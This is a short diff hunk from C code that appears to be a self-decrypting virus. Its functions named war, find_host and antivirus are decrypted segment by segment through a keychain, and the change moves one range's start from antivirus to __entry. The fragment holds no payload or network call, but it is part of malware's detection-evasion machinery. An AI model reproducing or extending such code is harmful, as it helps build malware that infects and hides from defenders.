@@ -56,6 +56,6 @@ void preload(void)
 	update_keychain_right(&keychain, (char *)war, (void *)find_host - (void *)war);
 	decrypt_right(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
 
-	update_keychain_left(&keychain, (char *)antivirus, (void *)war - (void *)antivirus);
+	update_keychain_left(&keychain, (char *)__entry, (void *)war - (void *)__entry);
 	decrypt_left(&keychain, (char *)war, (void *)find_host - (void *)war);
 }
